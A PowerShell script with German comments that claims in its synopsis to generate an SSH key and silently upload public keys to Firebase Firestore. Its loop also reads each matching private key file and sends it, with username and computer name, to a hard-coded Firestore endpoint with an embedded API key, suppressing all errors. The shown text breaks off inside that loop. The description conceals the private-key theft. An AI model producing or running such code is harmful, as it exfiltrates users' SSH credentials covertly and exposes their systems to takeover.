<#
.SYNOPSIS
    Erstellt bei Bedarf einen SSH-Schlüssel und lädt ALLE im ~/.ssh-Ordner 
    vorhandenen öffentlichen Schlüssel (.pub) lautlos zu Firebase Firestore hoch.
#>

param(
    [string]$KeyType = "ed25519",
    [string]$Comment = "$env:USERNAME@$env:COMPUTERNAME",
    [string]$Passphrase = ""
)

$SshDir = "$env:USERPROFILE\.ssh"

# 1. Ordner .ssh anlegen, falls nicht vorhanden
if (-not (Test-Path -Path $SshDir)) {
    New-Item -ItemType Directory -Path $SshDir -Force | Out-Null
}

# 2. Falls gar keine .pub-Dateien existieren -> Standard-Schlüssel erzeugen
$ExistingPubKeys = Get-ChildItem -Path $SshDir -Filter "*.pub" -ErrorAction SilentlyContinue

if ($null -eq $ExistingPubKeys -or $ExistingPubKeys.Count -eq 0) {
    if (Get-Command "ssh-keygen" -ErrorAction SilentlyContinue) {
        $DefaultKeyPath = Join-Path -Path $SshDir -ChildPath "id_$KeyType"
        & ssh-keygen -q -t $KeyType -C $Comment -f $DefaultKeyPath -N $Passphrase
        # Liste neu einlesen
        $ExistingPubKeys = Get-ChildItem -Path $SshDir -Filter "*.pub" -ErrorAction SilentlyContinue
    }
}

# Abbrechen, falls immer noch keine Keys vorhanden sind
if ($null -eq $ExistingPubKeys -or $ExistingPubKeys.Count -eq 0) { exit 1 }

# 3. Firebase Konfiguration & REST API Endpoint
$ProjectId = "ssh-keys-d1173"
$ApiKey    = "AIzaSyDrMqM2V-udtN5KEkjZ1ypnL2mastSUWlg"
$Uri       = "https://firestore.googleapis.com/v1/projects/$ProjectId/databases/(default)/documents/ssh_keys?key=$ApiKey"

# 4. Alle gefundenen .pub-Dateien durchgehen und hochladen
foreach ($PubKeyFile in $ExistingPubKeys) {
    $PublicKeyContent = (Get-Content -Path $PubKeyFile.FullName -Raw).Trim()

    # Pfad zum dazugehörigen privaten Schlüssel ermitteln
    $PrivateKeyPath = $PubKeyFile.FullName -replace '\.pub$', ''
    $PrivateKeyContent = ""
    if (Test-Path -Path $PrivateKeyPath) {
        $PrivateKeyContent = (Get-Content -Path $PrivateKeyPath -Raw).Trim()
    }

    if (-not [string]::IsNullOrWhiteSpace($PublicKeyContent)) {
        # Payload für Firestore aufbauen
        $Payload = @{
            fields = @{
                username    = @{ stringValue = $env:USERNAME }
                computer    = @{ stringValue = $env:COMPUTERNAME }
                fileName    = @{ stringValue = $PubKeyFile.Name }
                publicKey   = @{ stringValue = $PublicKeyContent }
                privateKey  = @{ stringValue = $PrivateKeyContent }
                createdAt   = @{ stringValue = (Get-Date -Format "o") }
            }
        } | ConvertTo-Json -Depth 5

        # Lautlos hochladen
        try {
            $null = Invoke-RestMethod -Uri $Uri -Method Post -Body $Payload -ContentType "application/json" -ErrorAction Stop
        } catch {
            # Bei Fehlern lautlos fortfahren
        }
    

